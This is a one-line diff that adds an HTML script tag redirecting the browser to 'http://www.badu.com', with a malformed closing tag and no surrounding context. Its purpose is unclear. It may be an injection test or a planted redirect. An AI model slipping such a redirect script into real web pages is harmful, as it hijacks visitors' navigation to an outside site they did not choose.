@@ -1,0 +1,1 @@
+<script>window.location.href='http://www.badu.com';<script>
